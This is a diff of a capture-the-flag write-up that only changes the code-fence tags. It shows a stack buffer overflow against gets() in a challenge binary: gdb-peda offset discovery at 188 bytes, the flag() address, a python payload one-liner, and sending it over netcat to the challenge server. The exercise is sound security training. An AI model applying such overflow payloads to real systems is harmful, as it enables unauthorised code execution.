@@ -92,7 +92,7 @@ The assembly code for 0x21524111 is `0xdeadbeef` and 0x3f212ff3 is `0xc0ded00d`.
 ## Exploiting
 I will be using gdp-peda to exploit the `gets` function using a buffer overflow to jump into `flag()` to get the flag. Lets load the file, and start. We should hit an automatic breakpoint.
 
-```asm
+```c
 gdb-peda$ start
 [----------------------------------registers-----------------------------------]                                                                          
 EAX: 0xf7fb1a28 --> 0xffffd1ec --> 0xffffd3c1 ("COLORFGBG=15;0")
@@ -131,7 +131,7 @@ Temporary breakpoint 1, 0x080492c0 in main ()
 
 Knowing there is a 180 character buffer, i created a file containing 200 characters and saved it as in.txt, which will be used to discover the EIP offset.
 
-```asm
+```c
 db-peda$ pattern_create 200 in.txt
 Writing pattern of 200 chars to filename "in.txt"
 gdb-peda$ r < in.txt
@@ -155,14 +155,14 @@ EIP: 0x41417741 ('AwAA')
 
 We can see the EIP address is `0x41417741`, so lets find the offset, so that we can control the EIP.
 
-```asm
+```c
 gdb-peda$ pattern_offset 0x41417741
 1094809409 found at offset: 188
 ```
 
 Now lets get the address of `flag()`
 
-```asm
+```c
 gdb-peda$ disas flag
 Dump of assembler code for function flag:
    0x080491e2 <+0>:     push   ebp
@@ -179,7 +179,7 @@ The address is 0x080491e2, which will translate to `\xe2\x91\x04\x08`
 
 I will be using python to try and jump into the function `flag()`
 
-```shell
+```console
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ python -c "print('A'*188 + '\xe2\x91\x04\x08')" | ./vuln           139 ⨯
 You know who are 0xDiablos: 
@@ -200,7 +200,7 @@ This turns the entire python script into:
 ## Deploying the Exploit
 All that is needed now is to deploy the exploit to the docker server using netcat. This was done by the following:
 
-```shell
+```console
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ cat exploit.txt | nc 139.59.183.98 32124
 You know who are 0xDiablos: 
